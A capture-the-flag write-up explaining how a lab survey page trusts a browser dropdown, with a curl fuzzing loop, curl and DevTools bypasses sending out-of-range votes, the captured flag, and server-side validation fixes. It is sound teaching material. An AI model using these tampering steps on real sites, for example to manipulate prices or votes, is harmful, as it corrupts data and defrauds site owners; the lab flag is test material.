# 🚩 5 : Client-Side Input Validation Bypass (Survey)

---

## 📝 Overview

This breach demonstrates how web applications can be compromised when input
validation exists only in the browser and not on the server. We identify a
"Client-Side Trust" vulnerability on the survey page, bypass the browser's
dropdown restriction by sending an out-of-range value directly to the server,
and discuss why server-side validation is the only reliable defense.

The core problem is this: the browser presents a dropdown limited to values
1-10, but the server accepts and processes any numeric value the client sends
— including values far outside the intended range.

---

## 🔍 The Vulnerability: Missing Server-Side Validation

### What is Client-Side Validation?

Client-side validation is any input restriction enforced by the browser —
HTML attributes, JavaScript checks, or UI controls like dropdowns and sliders.
It is useful for user experience (instant feedback, preventing typos) but
provides **zero security**.

The reason is simple: the browser is controlled by the user. Any restriction
the browser enforces can be trivially bypassed by anyone who knows how to
use DevTools, curl, or any HTTP client.

### The Survey Page

The survey page presents a voting form with a dropdown:

```html
<select name="valeur" onchange="javascript:this.form.submit();">
    <option value="1">1</option>
    <option value="2">2</option>
    ...
    <option value="10">10</option>
</select>
```

The dropdown only allows values 1-10. There is also a hidden field that
identifies which subject is being voted on:

```html
<input type="hidden" name="sujet" value="2">
```

The developer assumed the dropdown would enforce the valid range. But
dropdowns are HTML — any user can modify them, bypass them with curl,
or send arbitrary POST data directly to the server.

### Confirmed Behavior via Fuzzing

We wrote a bash fuzzer to systematically test which values trigger the flag:

```bash
for VALUE in 1 5 10 0 11 -1 100 1000 99999999 2147483647 5.5 10.1 abc ""; do
    curl -s -X POST "http://[IP]/?page=survey" \
        --data "sujet=1&valeur=$VALUE"
done
```

Results:

| Value | Flag triggered? | Notes |
|-------|----------------|-------|
| `1` – `10` | ❌ No | Valid range |
| `0` | ❌ No | Below range, ignored |
| `-1` | ❌ No | Negative, ignored |
| `11` | ✅ Yes | First value above limit |
| `100`, `1000` | ✅ Yes | Any integer > 10 |
| `5.5`, `10.1` | ❌ No | Floats truncated to integer |
| `abc`, `null` | ❌ No | Non-numeric, treated as 0 |
| `1e10` | ❌ No | Scientific notation not parsed |

The server check is effectively:
```php
if (is_numeric($valeur) && (int)$valeur > 10) {
    // flag
}
```

The flag triggers when the value is **numeric AND greater than 10 as an integer**.
This was reverse-engineered purely from server responses — without ever
seeing the source code. This technique is called **black box testing**.

---

## 🛠 The Exploit

### Method 1: curl (Command Line)

The most direct approach — bypass the browser entirely and send the POST
request manually:

```bash
curl -s "http://[IP]/?page=survey" --data "sujet=1&valeur=1000"
```

Breaking this down:
- `curl`: command-line HTTP client
- `--data "sujet=1&valeur=1000"`: POST body with subject ID and our
  out-of-range vote value
- The browser never gets involved — the restriction never applies

### Method 2: Browser DevTools — Edit HTML

1. Open the survey page
2. Press **F12** to open DevTools → **Elements** tab
3. Find any `<option value="10">10</option>`
4. Double click `10` inside `value="10"`
5. Change it to `99999`
6. Select that option from the dropdown — it auto-submits

### Method 3: Browser Console — JavaScript

```javascript
document.querySelector('select[name="valeur"]').value = "99999";
document.querySelector('form').submit();
```

All three methods achieve the same result: sending a value the server
was not designed to receive through its normal UI flow.

---

## 🏁 Result

```
FLAG: 03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa
```

---

## 🌍 Real-World Impact

This class of vulnerability appears constantly in real applications:

**a) Price Manipulation**
E-commerce sites that rely on client-side price validation can be exploited
by sending negative prices or zero-cost items directly via curl, bypassing
the JavaScript that prevents negative values in the UI.

**b) Quantity/Limit Bypass**
Applications that limit purchases to a maximum quantity (e.g., "max 5 per
customer") enforced only in the browser can be bypassed to order any amount.

**c) Rating/Vote Manipulation**
Voting systems like this one that enforce ranges only client-side can be
manipulated to submit votes outside the intended scale, corrupting averages
and rankings.

**d) Hidden Field Tampering**
The `sujet` hidden field on this page is another example of client-side
trust. Hidden fields are not secure — they are just HTML elements that
the browser sends back. Any user can modify them in DevTools. Developers
must validate hidden field values server-side just like any other input.

---

## 🛡️ Remediation Strategies

### 1. Always Validate on the Server

Client-side validation is for user experience only. Every constraint that
matters for security or data integrity must be enforced server-side:

```php
// VULNERABLE - relies on browser dropdown
$valeur = $_POST['valeur'];
// just uses it directly

// SECURE - validates on the server
$valeur = (int)$_POST['valeur'];
if ($valeur < 1 || $valeur > 10) {
    die("Invalid value. Must be between 1 and 10.");
}
```

### 2. Validate All Parameters — Including Hidden Fields

Hidden fields provide no security. The `sujet` parameter must also be
validated server-side — checking that it corresponds to an actual existing
subject ID before processing the vote:

```php
$allowed_subjects = [2, 3, 4, 5, 6];
if (!in_array((int)$_POST['sujet'], $allowed_subjects)) {
    die("Invalid subject.");
}
```

### 3. Never Trust the Client

The golden rule of secure development:

> **Assume every byte coming from the browser is a potential lie.**

This applies to form fields, hidden fields, cookies, headers, and URL
parameters equally. The browser is in the user's hands — treat everything
it sends as untrusted input that must be validated before use.

### 4. Use the Principle of Defense in Depth

Client-side validation is fine to keep for user experience — instant
feedback is helpful. But it must always be paired with identical
server-side validation. Never rely on one layer alone.

---

## 📊 Attack Chain Summary

```
1. Identified target    →  survey page with dropdown limited to 1-10
2. Recognized pattern   →  dropdown = client-side only restriction
3. Bypassed via curl    →  sent valeur=1000 directly in POST body
4. Confirmed with fuzzer →  any integer > 10 triggers the flag
5. Reverse engineered   →  server check is (int)valeur > 10
                            floats/negatives/strings do not trigger
```
